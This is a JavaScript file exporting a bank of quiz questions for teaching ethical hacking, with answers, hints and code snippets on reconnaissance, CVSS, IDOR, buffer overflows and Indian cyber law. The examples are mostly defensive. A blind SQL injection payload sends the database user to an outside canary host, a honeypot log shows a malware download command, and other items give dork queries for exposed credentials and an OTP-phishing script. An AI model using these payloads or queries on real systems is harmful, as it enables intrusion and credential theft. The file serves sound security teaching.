const questions = [
  {
    question: "What is the precise technical definition of 'Hacking' in computer science, and how does it differ from criminal cracking?",
    shortAnswer: "Hacking is the deep exploration and unconventional manipulation of computer systems to discover novel behaviors or flaws; cracking is the unauthorized exploitation of systems with malicious intent.",
    explanation: "Originally coined at MIT in the 1960s, 'hacking' referred to creative, intellectual problem-solving and optimizing computer hardware and software beyond standard specifications. Over time, media popularized 'hacking' as illegal digital intrusion. In professional cybersecurity, 'hacking' encompasses both defensive (ethical) analysis and offensive research, whereas 'cracking' specifically refers to breaching software protections, DRM, or security perimeters with malicious or unauthorized intent.",
    hint: "Think about the difference between an engineer stress-testing a vault lock versus a burglar picking the lock to steal money.",
    level: "basic",
    codeExample: `// Conceptual Distinction:
Hacking  = Reverse_Engineering + Creative_Exploration + Vulnerability_Discovery;
Cracking = Unauthorized_Intrusion + Malicious_Exploitation + Data_Theft;`
  },
  {
    question: "What are the fundamental differences between a 'Vulnerability', an 'Exploit', and a 'Payload' in cyber security terminology?",
    shortAnswer: "A vulnerability is an existing weakness/flaw; an exploit is the mechanism/code that takes advantage of the weakness; a payload is the actual malicious or test action executed on the target.",
    explanation: "In security architecture: 1. Vulnerability is a bug, misconfiguration, or design flaw in software (e.g., an unescaped SQL input field). 2. Exploit is the crafted input, script, or binary engineered to trigger that bug (e.g., `' OR '1'='1` or a buffer overflow ROP chain). 3. Payload is the ultimate package delivered to the victim machine upon successful exploitation (e.g., a reverse shell, ransomware encrypter, or benign diagnostic probe).",
    hint: "Recall the analogy: Vulnerability is the unlocked window; Exploit is the ladder used to reach it; Payload is what the climber carries inside.",
    level: "basic",
    codeExample: `// Exploit Pipeline Breakdown:
// 1. Vulnerability: Unchecked buffer in C function gets(buffer)
// 2. Exploit: 64 bytes of junk + overwritten return address pointer (0x7fffffffe420)
// 3. Payload: Shellcode spawned /bin/sh reverse TCP connection on port 4444`
  },
  {
    question: "What is a 'Zero-Day' (0-Day) vulnerability, and why does it represent the highest tier of threat in cybersecurity?",
    shortAnswer: "A vulnerability that is unknown to the software vendor and has zero days of official patches available, leaving systems completely defenseless against targeted exploits.",
    explanation: "A Zero-Day vulnerability refers to a security flaw that has been discovered by researchers, threat actors, or intelligence agencies before the original software vendor is aware of it. Because the vendor has had 'zero days' to develop, test, and release a security patch, traditional signature-based antivirus solutions and standard patch management workflows cannot prevent exploitation. Defense relies entirely on behavioral EDR, sandboxing, and zero-trust segmentation.",
    hint: "Remember that 'zero days' refers to the number of days the vendor has had to patch the flaw since becoming aware of it.",
    level: "moderate",
    codeExample: `// Vulnerability Lifecycle Timeline:
Day 0: Vulnerability discovered by researcher/attacker (Zero-Day Window Opens)
Day X: Vendor notified / In-the-wild exploit detected
Day Y: Vendor releases official security bulletin & patch (N-Day Window Begins)
Day Z: Enterprise admins apply patch across production fleets`
  },
  {
    question: "What constitutes an organization's 'Attack Surface' (Threat Surface), and what strategies are used to minimize it?",
    shortAnswer: "The total sum of all accessible points (open ports, web apps, APIs, human employees, protocols) where an adversary can enter or extract data; minimized via port closing, least privilege, and segmentation.",
    explanation: "An organization's attack surface includes all internet-facing IP addresses, exposed cloud storage buckets, open TCP/UDP network ports, third-party vendor integrations, legacy VPN endpoints, and even human employees susceptible to phishing. Minimizing attack surface involves closing unneeded ports, deprecating legacy protocols (like Telnet/FTP), disabling unnecessary OS services, enforcing micro-segmentation, and mandating Multi-Factor Authentication (MFA).",
    hint: "Think of a fortress: every additional gate, window, and pipe added to the perimeter increases the surface that guards must protect.",
    level: "basic",
    codeExample: `// Attack Surface Reduction Command:
// Scan open listening ports:
sudo nmap -sS -p- 192.168.1.100
// Disable vulnerable unnecessary services:
sudo systemctl stop telnet.socket && sudo systemctl disable telnet.socket
sudo ufw default deny incoming`
  },
  {
    question: "What is the mathematical definition of 'Cybersecurity Risk', and how do security architects calculate it?",
    shortAnswer: "Risk = Threat × Vulnerability × Impact (or Asset Value), representing the probability and financial severity of a potential breach.",
    explanation: "In qualitative and quantitative risk analysis: Threat is the frequency or capability of threat actors seeking to exploit a system; Vulnerability is the existence of unmitigated flaws; Impact is the tangible financial, operational, and legal damage (calculated in Indian Rupees ₹) if the threat succeeds. If an organization has a critical vulnerability on a system with zero external threat (e.g., an offline isolated test server), or strong controls on high-threat zones, overall risk is dramatically lowered.",
    hint: "Remember that Risk requires both an existing vulnerability and a viable threat that can exploit it.",
    level: "moderate",
    codeExample: `// Quantitative Risk Formula:
Annual_Loss_Expectancy_INR = Single_Loss_Expectancy (₹) * Annualized_Rate_of_Occurrence;
// Where: SLE = Asset_Value (₹) * Exposure_Factor (%)`
  },
  {
    question: "What was 'Phone Phreaking' in the 1970s, and why is it considered the historical precursor to modern computer hacking?",
    shortAnswer: "The exploration and reverse-engineering of telecommunications networks using audio tones (e.g., 2600 Hz tone) to control telephone routing switches without paying fees.",
    explanation: "In the 1960s and 1970s, early pioneers like John Draper ('Captain Crunch') and Steve Wozniak discovered that AT&T's long-distance telephone network used in-band signaling tones over the same copper wires as voice. By blowing a toy whistle from a Cap'n Crunch cereal box that generated an exact 2600 Hz tone, they could trick telephone central office trunk switches into resetting lines and granting free operator control. This established the foundational hacking culture of discovering hidden system signals.",
    hint: "Think about how sending an exact 2600 Hz audio tone down a telephone line tricked automated switches.",
    level: "moderate",
    codeExample: `// 2600 Hz In-Band Signaling Reset Concept:
// 2600 Hz tone transmitted -> Trunk line interprets as "call disconnected / trunk idle"
// Attacker enters routing trunk -> Dials operator multi-frequency (MF) tones to route international calls free.`
  },
  {
    question: "Under the Indian Information Technology (IT) Act 2000, what do Sections 43 and 66 define regarding unauthorized computer access?",
    shortAnswer: "Section 43 defines civil penalties for unauthorized access, data copying, or damage; Section 66 establishes criminal imprisonment up to 3 years and fines up to ₹5 Lakhs for hacking with fraudulent intent.",
    explanation: "Section 43 of the IT Act 2000 penalizes downloading, copying, extracting data, or introducing computer contaminants without permission of the owner, prescribing compensation to affected victims. Section 66 turns any dishonest or fraudulent act under Section 43 into a cognizable criminal offense punishable by imprisonment up to three years, a fine up to ₹5,00,000, or both. This legal boundary strictly separates authorized penetration testing from criminal hacking.",
    hint: "Remember the primary criminal hacking section of the Indian IT Act and its 3-year imprisonment penalty.",
    level: "moderate",
    codeExample: `// Legal Compliance Check:
if (!has_explicit_written_authorization(target_system, owner_signature)) {
    // Engaging in probing or exploitation violates Section 66 of IT Act 2000
    abort_security_testing();
}`
  },
  {
    question: "What is the difference between 'Passive Reconnaissance' and 'Active Reconnaissance' during the initial stages of a security assessment?",
    shortAnswer: "Passive reconnaissance gathers intelligence without directly interacting with the target's servers; active reconnaissance sends packets directly to probe target ports and services.",
    explanation: "Passive reconnaissance utilizes Open Source Intelligence (OSINT), public DNS records (whois, dig), certificate transparency logs (crt.sh), social media profiles, and search engine dorks (Google Hacking) without sending a single network packet to the target's firewall. Active reconnaissance directly connects to the target via port scanning (nmap), web spidering, and vulnerability scanning, which generates log entries and can trigger IDS alerts.",
    hint: "Think about reading public news articles about a company (passive) versus rattling their physical front door handles (active).",
    level: "basic",
    codeExample: `// Passive vs Active Commands:
// PASSIVE: Query public certificate transparency logs (Zero target contact)
curl -s "https://crt.sh/?q=%.kolkata-bank.in&output=json" | jq .[].name_value

// ACTIVE: Send TCP SYN packets directly to target IP (Generates firewall logs)
nmap -sV -sC -Pn 203.0.113.50`
  },
  {
    question: "Why is an 'Out-of-Band' (OOB) vulnerability testing technique essential when testing Blind SQL Injection or Blind SSRF?",
    shortAnswer: "Because the application returns zero visible errors or text output in the HTTP response, forcing the tester to detect exploitation via outbound DNS or HTTP callbacks.",
    explanation: "In 'blind' vulnerability scenarios, web applications suppress all error messages and database content, returning identical generic HTTP 200 responses whether an exploit succeeds or fails. To confirm vulnerability without damaging databases, ethical hackers inject payloads that trigger outbound network callbacks (e.g., forcing a database to resolve `attacker-subdomain.canary.com` via DNS or ping). Receiving the external DNS query proves remote code execution or SQL injection.",
    hint: "Recall how forcing a target database to look up a custom domain name proves it executed your injected command.",
    level: "expert",
    codeExample: `// Blind Out-of-Band SQL Injection Payload (Oracle/PostgreSQL):
SELECT UTL_HTTP.request('http://kolkata-audit-canary.net/' || user) FROM dual;
// If the attacker receives an HTTP GET on their server, the blind SQLi is proven.`
  },
  {
    question: "What is a 'Threat Actor', and how does a 'Script Kiddie' differ technically and motivationally from an 'Advanced Persistent Threat' (APT)?",
    shortAnswer: "A threat actor is any entity executing malicious attacks; Script Kiddies use pre-made automated tools for notoriety with low skill, while APTs are highly funded nation-states conducting long-term espionage.",
    explanation: "Threat actors span a wide spectrum of skill, motivation, and resources. Script Kiddies lack deep programming or networking knowledge, running downloaded automated scripts (e.g., LOIC, SQLmap) for personal ego or trolling. Advanced Persistent Threats (APTs) are state-sponsored or elite military cyber units (e.g., APT28, Lazarus Group) operating with multi-million-rupee budgets, custom zero-day exploits, and disciplined multi-month stealth campaigns to steal intellectual property or sabotage critical infrastructure.",
    hint: "Compare an amateur downloading a point-and-click DDoS tool versus a military team developing custom kernel rootkits.",
    level: "basic",
    codeExample: `// Threat Actor Matrix:
Script Kiddie: Skill = LOW, Motivation = Vandalism/Ego, Tools = Public GitHub repos, Stealth = NONE;
APT Group:     Skill = ELITE, Motivation = Geopolitical/Espionage, Tools = Custom 0-Days, Stealth = EXTREME;`
  },
  {
    question: "How does the 'STRIDE' threat modeling framework categorize potential vulnerabilities during the system design phase?",
    shortAnswer: "STRIDE classifies threats into Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, and Elevation of Privilege.",
    explanation: "Developed by Microsoft, STRIDE helps security engineers systematically analyze application components before writing code: 1. Spoofing (authenticity threat), 2. Tampering (integrity threat), 3. Repudiation (non-repudiation threat), 4. Information Disclosure (confidentiality threat), 5. Denial of Service (availability threat), and 6. Elevation of Privilege (authorization threat). Each category maps to corresponding defensive mitigations (e.g., TLS, HMACs, digital signatures, least privilege).",
    hint: "Recall the 6 letters of STRIDE: Spoofing, Tampering, Repudiation, Info Disclosure, DoS, Elevation of Privilege.",
    level: "moderate",
    codeExample: `// STRIDE Threat-to-Defense Mapping:
Spoofing               --> Enforce Strong Authentication & TLS Certificates
Tampering              --> Enforce Cryptographic HMACs & Digital Signatures
Repudiation            --> Enforce Immutable WORM Audit Trails
Information Disclosure --> Enforce AES-256 Field Level Encryption
Denial of Service      --> Enforce Anycast Rate-Limiting & Autoscaling
Elevation of Privilege --> Enforce Role-Based Access Control (RBAC)`
  },
  {
    question: "What is 'Buffer Overflow', and how does an ethical hacker identify whether a legacy C/C++ binary is vulnerable to memory corruption?",
    shortAnswer: "Writing more data to a fixed-size memory buffer than it can hold, overwriting adjacent stack memory and control pointers (like EIP/RIP); identified by injecting cyclic patterns to monitor segmentation faults.",
    explanation: "In low-level languages without memory safety (like C/C++), functions like `strcpy()`, `gets()`, and `sprintf()` write user input directly to stack buffers without bounds checking. An ethical hacker sends a unique cyclic alphanumeric string (e.g., `Aa0Aa1Aa2...`) to identify the exact offset where the instruction pointer (EIP/RIP) is overwritten, enabling calculation of execution flow redirection to a shellcode payload.",
    hint: "Think about pouring 500ml of water into a 200ml cup; the excess spills over and covers adjacent papers on the desk.",
    level: "expert",
    codeExample: `// Vulnerable C Code:
void vulnerable_function(char *user_input) {
    char buffer[64];
    strcpy(buffer, user_input); // DANGEROUS: No bounds checking! Overwrites return address.
}
// Safe Modern C Alternative:
strncpy(buffer, user_input, sizeof(buffer) - 1);`
  },
  {
    question: "Why is 'Responsible Disclosure' (Coordinated Vulnerability Disclosure) the foundational ethical principle of white-hat hacking?",
    shortAnswer: "It gives software vendors a reasonable window (e.g., 90 days) to develop and release a patch before the vulnerability details are published publicly.",
    explanation: "Responsible disclosure protects the general public from cyber attacks. When an ethical researcher discovers a critical vulnerability in banking or medical software, disclosing it immediately on social media (full disclosure) allows malicious black-hats to weaponize the flaw before a patch exists. Under coordinated disclosure, the researcher provides technical details privately to the vendor, agrees on a remediation timeline (standard 90-day grace period), and only publishes research after patches are deployed.",
    hint: "Think about giving a homeowner time to fix their broken front lock before announcing to the neighborhood that the door is wide open.",
    level: "moderate",
    codeExample: `// Coordinated Vulnerability Disclosure Timeline:
Day 1:  Researcher discovers flaw; submits PGP-encrypted advisory to security@vendor.com
Day 14: Vendor confirms reproducibility and assigns CVE identifier
Day 60: Vendor deploys security patch in production release
Day 90: Researcher publishes blog post detailing root cause and remediation`
  },
  {
    question: "What is 'Google Dorking' (Advanced Search Operators), and how is it used in security auditing?",
    shortAnswer: "Using specialized search engine syntax (e.g., filetype, inurl, intitle) to find inadvertently exposed server configuration files, passwords, or vulnerable portals.",
    explanation: "Search engines continuously index public web servers. By crafting advanced search queries like `filetype:env DB_PASSWORD`, `inurl:/wp-content/uploads/ ext:sql`, or `intitle:\"index of\" \"config.json\"`, security analysts can locate sensitive credential files, database dumps, and unprotected webcam streams that administrators accidentally made public. Defensive audits use dorking to discover and purge exposed organizational assets.",
    hint: "Think of using search engine filters to find exposed `.env` or `.sql` backup files on company domains.",
    level: "basic",
    codeExample: `// Common Google Dork Queries for Security Auditing:
site:example.com filetype:pdf "confidential"
site:example.com inurl:admin "login"
site:example.com filetype:log "password"
site:example.com ext:sql "CREATE TABLE"`
  },
  {
    question: "What is the role of a 'Bug Bounty Program' in modern enterprise vulnerability management?",
    shortAnswer: "A crowdsourced initiative that offers financial rewards (bounties) to external independent researchers for responsibly discovering and reporting valid security vulnerabilities.",
    explanation: "Traditional penetration testing hires a small consulting team for two weeks once a year. In contrast, public and private Bug Bounty platforms (e.g., HackerOne, Bugcrowd) incentivize thousands of global ethical hackers to continuously probe enterprise systems year-round. Organizations pay monetary rewards based on vulnerability severity (e.g., ₹10,000 for Low severity, up to ₹10,00,000+ for Critical Remote Code Execution), drastically lowering the risk of hostile black-hat exploitation.",
    hint: "Think of crowdsourcing security testing to ethical researchers worldwide, rewarding them financially per validated bug found.",
    level: "moderate",
    codeExample: `// Bug Bounty Payout Matrix (Typical Indian FinTech Platform):
Low Severity (Information Disclosure)        --> ₹10,000 - ₹25,000
Medium Severity (CSRF on Settings)           --> ₹25,000 - ₹75,000
High Severity (Stored XSS on Admin Panel)    --> ₹75,000 - ₹2,50,000
Critical Severity (Remote Code Execution)    --> ₹5,00,000 - ₹15,00,000+`
  },
  {
    question: "What is a 'Honeypot', and how does it assist threat researchers in studying novel hacker tactics?",
    shortAnswer: "A decoy computer system deliberately set up with vulnerabilities to lure attackers, log their reconnaissance techniques, and analyze new exploits without endangering production networks.",
    explanation: "A honeypot has no legitimate production purpose; any connection attempt to it is inherently unauthorized and suspicious. Low-interaction honeypots (e.g., Honeyd, Cowrie) simulate specific network services like SSH or Telnet to capture attacker IP addresses and default password dictionaries. High-interaction honeypots run real operating systems in isolated sandboxes, capturing full malware binaries, zero-day payloads, and command-and-control communication channels for threat intelligence.",
    hint: "Think of a fake bank vault loaded with surveillance cameras and dye-packs designed solely to catch and study bank robbers.",
    level: "moderate",
    codeExample: `// Cowrie SSH Honeypot Logging Output:
[2026-08-23 01:15:22] New connection from 198.51.100.42:54210
[2026-08-23 01:15:24] Login attempt: username='admin', password='P@ssword123' [FAILED]
[2026-08-23 01:15:26] Attacker executed command: 'wget http://malware-drop.com/bot.sh'`
  },
  {
    question: "How does the 'Common Vulnerability Scoring System' (CVSS v3.1) calculate the severity score of a security flaw?",
    shortAnswer: "By evaluating Base Metrics (Attack Vector, Complexity, Privileges Required, User Interaction, Scope, and C-I-A Impact) on a numerical scale from 0.0 to 10.0.",
    explanation: "CVSS provides an open standard to prioritize vulnerability remediation: 1. Low (0.1 - 3.9), 2. Medium (4.0 - 6.9), 3. High (7.0 - 8.9), and 4. Critical (9.0 - 10.0). A vulnerability with Network attack vector (AV:N), Low attack complexity (AC:L), None privileges required (PR:N), None user interaction (UI:N), and High Impact across Confidentiality, Integrity, and Availability (C:H/I:H/A:H) receives a maximum 10.0 Critical score (e.g., Log4Shell, EternalBlue).",
    hint: "Recall that CVSS scores range from 0.0 to 10.0, where 9.0+ represents a Critical flaw requiring emergency patching.",
    level: "moderate",
    codeExample: `// CVSS v3.1 Vector String Example (Log4Shell CVE-2021-44228):
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H  --> Score: 10.0 (CRITICAL)`
  },
  {
    question: "What is 'Reverse Engineering' in software security, and what tools are used to disassemble compiled binaries?",
    shortAnswer: "The process of analyzing compiled machine code without source code to understand logic, extract encryption keys, or find vulnerabilities; performed using disassemblers like Ghidra and IDA Pro.",
    explanation: "When developers compile C/C++ or Rust code into native binaries (.exe, ELF), the original human-readable source code is converted into binary machine instructions. Security researchers use disassemblers and decompilers (NSA Ghidra, IDA Pro, Radare2, x64dbg) to reconstruct the assembly instructions (x86_64/ARM) and approximate high-level C pseudocode. This allows ethical hackers to identify hidden backdoor accounts, hardcoded cryptographic keys, and buffer overflow vulnerabilities.",
    hint: "Think about taking a baked cake and analyzing its chemical components to deduce the original recipe.",
    level: "expert",
    codeExample: `// Decompiled Assembly in Ghidra:
MOV EAX, DWORD PTR [RBP - 0x10]
CMP EAX, 0x539                   // Compares input to 1337 (Hardcoded secret PIN)
JNE 0x00401250                   // Jumps to "Access Denied" if false`
  },
  {
    question: "Why is 'Port Scanning' with tools like Nmap considered an active reconnaissance activity, and what is a TCP SYN (Stealth) scan?",
    shortAnswer: "Port scanning sends packets to target IP addresses to discover listening services; a TCP SYN scan sends SYN packets and resets (RST) upon receiving SYN-ACK, never completing the full 3-way handshake.",
    explanation: "A TCP SYN scan (`nmap -sS`) is called a 'half-open' or 'stealth' scan. The scanner sends a TCP SYN packet to a port. If the port is open, the target replies with SYN-ACK. Instead of sending the final ACK to establish a connection, the scanner immediately sends a RST (Reset) packet to tear down the connection. Historically, this prevented the connection from being recorded in application-level logs (like Apache access.log), though modern firewalls still detect the activity.",
    hint: "Recall that a SYN scan sends SYN, receives SYN-ACK, and replies with RST to avoid completing the TCP handshake.",
    level: "moderate",
    codeExample: `// TCP SYN Scan Flow:
Scanner ------------ SYN ------------> Target Port 80
Scanner <-------- SYN-ACK ----------- Target (Port is OPEN)
Scanner ------------ RST ------------> Target (Connection Aborted immediately)`
  },
  {
    question: "What is 'Threat Intelligence' (CTI), and how do organizations utilize Indicators of Compromise (IoCs)?",
    shortAnswer: "Evidence-based knowledge about cyber threats; IoCs (malicious IP addresses, domain names, file SHA-256 hashes) are ingested by SIEM/firewalls to automatically block attacks.",
    explanation: "Cyber Threat Intelligence (CTI) aggregates telemetry from global sensor networks, dark web forums, and malware analysis sandboxes. Indicators of Compromise (IoCs) are forensic artifacts that signal an intrusion has occurred (e.g., a specific MD5/SHA-256 malware hash, a known Command-and-Control IP address, or a malicious registry key). Organizations ingest IoC threat feeds via standards like STIX/TAXII into their SIEM (Splunk, Wazuh) and firewalls to block malicious connections in real time.",
    hint: "Think of an international police database of known criminal vehicle license plates that automatically triggers highway tolls.",
    level: "moderate",
    codeExample: `// Example Threat Intelligence IoC Record (STIX JSON):
{
  "type": "indicator",
  "pattern": "[file:hashes.'SHA-256' = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855']",
  "name": "DarkSide Ransomware Binary Hash",
  "valid_from": "2026-08-23T00:00:00Z"
}`
  },
  {
    question: "What is the difference between 'Source Code Review' (White-Box) and 'Black-Box Penetration Testing'?",
    shortAnswer: "Source code review analyzes internal programming logic with full visibility; black-box testing simulates an external attacker with zero prior knowledge of internal code or architecture.",
    explanation: "In a White-Box assessment, the security auditor is provided with source code, architectural diagrams, API documentation, and database schemas (Static Application Security Testing - SAST). This allows exhaustive discovery of obscure edge-case logic bugs. In Black-Box testing, the tester acts like an external hacker on the internet, probing only exposed endpoints without internal visibility (Dynamic Application Security Testing - DAST), validating real-world exploitability.",
    hint: "Think of inspecting an engine with the hood open and blueprints in hand (white-box) vs testing a car from the driver's seat with no manual (black-box).",
    level: "basic",
    codeExample: `// Testing Methodology Comparison:
White-Box = Full Access (Source Code + DB Schema + Configs) --> Highest Depth & Completeness;
Grey-Box  = Partial Access (User-Level Credentials + API Docs) --> Realistic Hybrid Assessment;
Black-Box = Zero Prior Knowledge (Public IP/Domain only)       --> Real-World Attacker Simulation;`
  },
  {
    question: "How does a 'Logic Flaw' differ from a standard syntax or memory corruption vulnerability, and why are logic flaws harder for automated scanners to find?",
    shortAnswer: "A logic flaw violates intended business workflows (e.g., negative payment amounts or skipping payment steps) while using completely valid syntax, making automated scanners blind to them.",
    explanation: "Automated vulnerability scanners look for known technical patterns (e.g., SQL syntax errors, unencoded HTML tags, memory crashes). A business logic flaw operates on syntactically pristine code: for example, modifying an e-commerce HTTP request from `quantity=1&price=500` to `quantity=1&price=-500` or changing an API parameter from `account_id=101` to `account_id=102` (IDOR). Because no crashes or errors occur, finding logic flaws requires deep human understanding of business intent.",
    hint: "Consider an online store where entering a negative price passes all syntax checks and credits your bank account instead of charging it.",
    level: "expert",
    codeExample: `// Business Logic Flaw Example:
// Insecure Checkout Controller:
function processCheckout(cart, userCoupon) {
    let total = calculateSubtotal(cart);
    total = total - userCoupon.discountAmount; // If discount > total, total becomes NEGATIVE!
    chargeCreditCard(total);                   // Gateway processes negative amount as a REFUND!
}`
  },
  {
    question: "What is the primary function of the Indian Computer Emergency Response Team (CERT-In) under the Ministry of Electronics and Information Technology (MeitY)?",
    shortAnswer: "CERT-In is the national nodal agency for cybersecurity incident response, issuing security alerts, coordinating breach remediation, and enforcing mandatory 6-hour incident reporting.",
    explanation: "Established under Section 70B of the IT Act 2000, CERT-In serves as India's premier cybersecurity agency. It performs threat forecasting, vulnerability alerting, incident handling, and emergency response coordination during national cyber crises. Under CERT-In directions, all government and commercial entities in India must mandatorily report specified cybersecurity incidents (such as ransomware, data leaks, or server compromises) within 6 hours of discovery.",
    hint: "Remember the national nodal cybersecurity agency of India and its 6-hour mandatory incident reporting rule.",
    level: "moderate",
    codeExample: `// CERT-In Compliance Directive:
Mandatory_Reporting_Window = "Within 6 hours of noticing cyber incident";
Nodal_Agency               = "CERT-In (Indian Computer Emergency Response Team)";
Statutory_Backing          = "Section 70B of Information Technology Act, 2000";`
  },
  {
    question: "What is 'Social Engineering' in the context of hacking, and why is it often called 'hacking the human OS'?",
    shortAnswer: "Manipulating human psychology (trust, fear, urgency, authority) to deceive employees into disclosing passwords or executing unauthorized actions without exploiting software bugs.",
    explanation: "No matter how impenetrable a company's firewalls and cryptographic algorithms are, human employees remain a vulnerable entry point. Attackers use psychological triggers—such as impersonating an executive demanding an urgent wire transfer (Business Email Compromise), calling tech support claiming to be an employee locked out (Pretexting), or leaving malware-infected USB drives in parking lots (Baiting). It bypasses technical controls by exploiting human trust.",
    hint: "Think about convincing a receptionist over the phone to reset a CEO password rather than writing complex exploit code.",
    level: "basic",
    codeExample: `// Social Engineering Psychological Vector:
Attacker Call: "Hello, this is Debangshu from IT Helpdesk. We detected a virus on your Kolkata terminal. Please read the 6-digit OTP sent to your phone immediately to verify your identity."
// Result: Exploits Authority & Urgency to bypass 2FA without writing code.`
  },
  {
    question: "What is 'Fuzzing' (Fuzz Testing), and how do security researchers use tools like AFL (American Fuzzy Lop) to discover unknown memory corruption bugs?",
    shortAnswer: "An automated testing technique that feeds millions of malformed, unexpected, or random inputs into a target program until it crashes, pinpointing hidden memory flaws.",
    explanation: "Fuzzing automates vulnerability discovery by generating massive permutations of input data (e.g., malformed PDF headers, invalid network packets, oversized image files) and passing them to an application while monitoring CPU registers. Coverage-guided fuzzers like AFL or libFuzzer use compile-time instrumentation to observe which code paths are executed, mutating inputs to systematically trigger unhandled exceptions, memory leaks, and buffer overflows.",
    hint: "Think of an automated robotic monkey banging on a keyboard typing millions of strange characters into a software input to see when it crashes.",
    level: "expert",
    codeExample: `// Running American Fuzzy Lop (AFL) on an Image Parser:
afl-gcc -o parser_instrumented parser.c
afl-fuzz -i test_inputs/ -o findings_crashes/ ./parser_instrumented @@
// AFL monitors execution paths and saves inputs that cause SIGSEGV crashes.`
  },
  {
    question: "What is an 'Insecure Direct Object Reference' (IDOR), and why is it one of the most common web application vulnerabilities found in ethical hacking?",
    shortAnswer: "An access control flaw where an application uses user-supplied input to access database objects directly without verifying whether the requesting user is authorized to access that object.",
    explanation: "IDOR occurs when an application exposes a direct reference to an internal database key in an API request (e.g., `GET /api/v1/user/105/invoice.pdf`). If a logged-in user with ID 105 changes the URL to `GET /api/v1/user/106/invoice.pdf` and the backend fails to verify whether the caller owns record 106, the user can illegally download someone else's sensitive invoice. It represents a fundamental failure of server-side authorization.",
    hint: "Think about changing the account ID in a website URL from 105 to 106 and seeing another student's grade sheet.",
    level: "moderate",
    codeExample: `// Vulnerable vs Secure API Endpoint:
// VULNERABLE:
app.get('/api/invoice/:id', async (req, res) => {
    const invoice = await db.findInvoice(req.params.id); // Direct lookup with zero ownership check!
    return res.json(invoice);
});

// SECURE:
app.get('/api/invoice/:id', async (req, res) => {
    const invoice = await db.findInvoice(req.params.id);
    if (invoice.ownerId !== req.session.userId) return res.status(403).send("Forbidden"); // Validated!
    return res.json(invoice);
});`
  },
  {
    question: "What is the difference between 'Static Application Security Testing' (SAST) and 'Dynamic Application Security Testing' (DAST)?",
    shortAnswer: "SAST inspects source code without executing the program (inside-out); DAST inspects running applications from the outside by sending simulated attacks (outside-in).",
    explanation: "SAST tools (e.g., SonarQube, Semgrep, Checkmarx) parse source code syntax trees directly inside CI/CD developer pipelines, finding insecure functions (like `strcpy` or SQL string concatenations) before deployment. DAST tools (e.g., OWASP ZAP, Burp Suite Enterprise) launch HTTP requests against a live, running server, discovering runtime configuration issues, authentication bypasses, and live server errors without needing source code access.",
    hint: "Remember: SAST reads the code (Static); DAST attacks the running web server (Dynamic).",
    level: "moderate",
    codeExample: `// SAST vs DAST Comparison:
SAST (Static Analysis):  Input = Source Code (.js/.java/.c) --> Finds code-level flaws early in IDE;
DAST (Dynamic Analysis): Input = Running URL (http://target.com) --> Validates real runtime exploitability;`
  },
  {
    question: "What is a 'Rootkit', and why is it considered the most dangerous form of persistence deployed during post-exploitation?",
    shortAnswer: "A collection of stealth malware tools that subvert the operating system kernel, hiding files, processes, and network connections from antivirus and administrative task managers.",
    explanation: "Unlike ordinary malware that runs in user space, a kernel-mode rootkit installs drivers directly into Ring 0 (the OS kernel). By hooking internal system call tables (e.g., `sys_call_table` in Linux or SSDT in Windows), it modifies the behavior of commands like `ps`, `netstat`, or `ls`. When an administrator queries running processes, the rootkit intercepts the call and deletes its own process ID from the list, making the infection completely invisible to standard OS diagnostic tools.",
    hint: "Think about an invisible ghost that intercepts the security guard's clipboard and erases its own name from the guest logbook.",
    level: "expert",
    codeExample: `// Kernel Syscall Hooking Concept (Rootkit):
asmlinkage int (*original_sys_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
// Rootkit replaces pointer to filter out files beginning with "rootkit_hidden_"`
  },
  {
    question: "Why must ethical hackers strictly define the 'Rules of Engagement' (RoE) and 'Scope of Work' before commencing any penetration test?",
    shortAnswer: "To establish legal authorization, define target IP boundaries, specify testing time windows, and prevent accidental outages on production systems.",
    explanation: "A Rules of Engagement (RoE) document is a legally binding contract signed by the client and penetration testing firm. It specifies exact in-scope domains and IP ranges (e.g., `192.168.10.0/24`), explicitly lists out-of-scope mission-critical infrastructure (e.g., live hospital ICU servers or industrial blast furnace valves), establishes testing hours, defines emergency contact protocols, and gives written legal permission under cyber law.",
    hint: "Remember that testing a server not explicitly listed in the Scope of Work constitutes illegal hacking under cyber law.",
    level: "basic",
    codeExample: `// Rules of Engagement Core Checklist:
[X] Explicit In-Scope IP Addresses & Domain Names
[X] Explicitly Excluded Critical Production Servers
[X] Allowed Testing Windows (e.g., Off-Peak: 01:00 AM - 05:00 AM IST)
[X] Emergency Stop Protocol & Lead Contact Phone Numbers
[X] Signed Authorization Letter under IT Act 2000 Section 43/66`
  },
  {
    question: "What is the core mindset required to transition from an amateur security student to a professional ethical hacker and defender?",
    shortAnswer: "A disciplined methodology combining deep fundamental mastery of networking/code, rigorous ethical compliance, continuous research curiosity, and an adversarial mindset.",
    explanation: "Amateurs rely on automated point-and-click tools without understanding underlying network protocols or memory models. True security professionals combine deep low-level knowledge (TCP/IP, assembly, OS internals, web architectures) with the hacker mindset—asking 'How can this system be made to behave in ways the author never intended?'. They respect legal and ethical boundaries, document findings clearly, and focus on designing resilient defenses that empower society.",
    hint: "Conclude by recognizing that ethical hacking combines deep technical rigor, creative problem solving, and unwavering legal responsibility.",
    level: "expert",
    codeExample: `// The Professional Ethical Hacker Formula:
Professional_Excellence = (Deep_Low_Level_Technical_Foundations + 
                           Adversarial_Creative_Mindset + 
                           Rigorous_Legal_&_Ethical_Discipline) - Reliance_On_Automated_Tools;`
  }
];

export default questions;
